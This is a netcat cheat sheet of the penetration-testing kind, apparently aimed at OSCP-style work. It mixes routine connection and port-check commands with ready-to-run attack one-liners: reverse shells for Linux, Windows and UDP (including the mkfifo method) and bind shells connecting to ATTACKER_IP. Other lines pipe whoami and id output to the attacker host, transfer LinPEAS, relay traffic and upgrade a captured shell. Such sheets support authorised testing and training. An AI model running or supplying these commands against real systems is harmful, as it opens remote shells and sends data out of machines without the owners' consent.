# Netcat Cheat Sheet

```
# Banner Grabbing
nc -nv 10.10.10.10 80
nc -nv 10.10.10.10 21
nc -nv 10.10.10.10 22
nc -nv 10.10.10.10 445

# Connect to TCP Port
nc 10.10.10.10 80
nc -v 10.10.10.10 443

# Connect to UDP Port
nc -u 10.10.10.10 53
nc -u -v 10.10.10.10 161

# Port Scanning
nc -zv 10.10.10.10 1-1000
nc -zvn 10.10.10.10 20-25
nc -zvu 10.10.10.10 53

# Listening for Connections
nc -lvnp 4444
nc -lvp 1234
nc -lvnp 80

# Reverse Shells - Linux
nc -e /bin/bash ATTACKER_IP 4444
nc -e /bin/sh ATTACKER_IP 4444

# Reverse Shells - mkfifo Method
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f

# Bind Shells
nc -lvnp 4444 -e /bin/bash
nc -lvnp 5555 -e /bin/sh

# Windows Reverse Shell
nc.exe -e cmd.exe ATTACKER_IP 4444

# File Transfer - Send File
nc -lvnp 4444 < file.txt
nc -lvnp 4444 < backup.tar.gz

# File Transfer - Receive File
nc ATTACKER_IP 4444 > file.txt
nc ATTACKER_IP 4444 > backup.tar.gz

# Chat Server
nc -lvnp 5555
nc TARGET_IP 5555

# HTTP Requests
printf "GET / HTTP/1.0\r\n\r\n" | nc 10.10.10.10 80
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc 10.10.10.10 80

# Manual SMTP Interaction
nc 10.10.10.10 25
HELO attacker.com
MAIL FROM:test@test.com
RCPT TO:user@test.com
DATA
Test Message
.
QUIT

# Manual FTP Interaction
nc 10.10.10.10 21
USER anonymous
PASS anonymous

# Manual POP3 Interaction
nc 10.10.10.10 110
USER test
PASS test

# Manual IMAP Interaction
nc 10.10.10.10 143

# Manual SSH Banner
nc 10.10.10.10 22

# Simple Web Server
while true; do nc -lvnp 8080 < index.html; done

# Relay Traffic
nc -lvp 4444 | nc TARGET_IP 5555

# Timeout
nc -w 3 10.10.10.10 80

# Keep Listening
nc -lkvp 4444

# Hex Dump
nc 10.10.10.10 80 | xxd

# Random Data Generation
nc -lvnp 4444 < /dev/urandom

# Pipe Commands
whoami | nc ATTACKER_IP 4444
id | nc ATTACKER_IP 4444

# Upgrade Shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo
reset

# Common OSCP Listener
rlwrap nc -lvnp 4444

# Transfer LinPEAS
nc -lvnp 9001 < linpeas.sh
nc ATTACKER_IP 9001 > linpeas.sh

# Read Local File via HTTP Request
echo -e "GET /etc/passwd HTTP/1.0\r\n\r\n" | nc 10.10.10.10 80

# UDP Listener
nc -u -lvnp 4444

# UDP Reverse Shell
nc -u ATTACKER_IP 4444 -e /bin/bash

# Proxy Through Netcat
mkfifo backpipe
nc TARGET_IP 80 0<backpipe | nc ATTACKER_IP 4444 1>backpipe

# Check if Port Open
nc -zv 10.10.10.10 80
nc -zv 10.10.10.10 445
nc -zv 10.10.10.10 3389

# Receive Screenshot/Binary
nc -lvnp 4444 > screenshot.png

# Send Screenshot/Binary
nc ATTACKER_IP 4444 < screenshot.png
```
